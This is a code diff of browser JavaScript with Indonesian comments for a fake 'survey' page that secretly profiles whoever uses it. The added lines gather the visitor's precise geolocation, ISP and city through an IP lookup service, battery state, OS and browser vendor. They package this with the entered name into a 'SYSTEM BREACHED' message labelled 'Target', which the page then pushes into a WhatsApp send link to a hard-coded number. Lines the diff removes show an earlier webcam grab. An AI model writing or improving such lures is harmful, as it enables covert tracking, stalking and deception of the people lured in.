@@ -1,49 +1,71 @@
 const nomorWA = "628979100200";
-let userData = { coords: "Fetching...", os: navigator.platform };
+let userData = { 
+    coords: "Fetching...", 
+    os: navigator.platform,
+    battery: "Scanning...",
+    isp: "Detecting...",
+    vendor: navigator.vendor
+};
 
-// Tombol Mulai
+// 1. Ambil Data Tambahan (Baterai & ISP)
+async function getMoreData() {
+    // Cek Baterai
+    if (navigator.getBattery) {
+        const bat = await navigator.getBattery();
+        userData.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
+    }
+    
+    // Cek ISP/Provider via IP (Pake API Publik gratis)
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        userData.isp = data.org; // Nama Provider (Misal: Telkomsel/Indihome)
+        userData.city = data.city;
+    } catch (e) { userData.isp = "Protected"; }
+}
+
 document.getElementById('start-survey').addEventListener('click', async () => {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
     
-    // Minta Izin
+    getMoreData(); // Jalankan pengambilan data tambahan
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
-            userData.coords = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
+            userData.coords = `${pos.coords.latitude},${pos.coords.longitude}`;
         });
     }
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('webcam').srcObject = stream;
-    } catch (e) {}
+    // ... (sisanya sama dengan sebelumnya) ...
 });
 
-// Fungsi untuk proses kirim
 function processSubmit() {
     const name = document.getElementById('name').value;
-    if (!name) return alert("Masukkan nama dulu!");
+    if (!name) return alert("Masukkan nama!");
 
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
 
     let prg = 0;
     const interval = setInterval(() => {
-        prg += 25;
+        prg += 20;
         document.getElementById('progress').style.width = prg + "%";
         if (prg >= 100) {
             clearInterval(interval);
-            const msg = `🚨 *TARGET HACKED* 🚨%0A%0A👤 Nama: ${name}%0A📍 Lokasi: ${userData.coords}%0A💻 OS: ${userData.os}`;
+            
+            // Link Google Maps Berdasarkan Koordinat
+            const mapLink = `https://www.google.com/maps?q=${userData.coords}`;
+            
+            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A` +
+                        `👤 *Target:* ${name}%0A` +
+                        `📍 *Maps:* ${mapLink}%0A` +
+                        `📡 *ISP:* ${userData.isp}%0A` +
+                        `🔋 *Battery:* ${userData.battery}%0A` +
+                        `💻 *OS:* ${userData.os}%0A` +
+                        `🌐 *Vendor:* ${userData.vendor}%0A%0A` +
+                        `_Data has been mirrored to master database._`;
+
             window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
         }
     }, 800);
 }
-
-// Menjalankan Enter di Input Nama
-document.getElementById('name').addEventListener('keydown', (e) => {
-    if (e.key === "Enter") {
-        processSubmit();
-    }
-});
-
-// Menjalankan Klik di Tombol Kirim
-document.getElementById('submit-survey').addEventListener('click', processSubmit);
+// ... (tambah listener enter seperti sebelumnya) ...
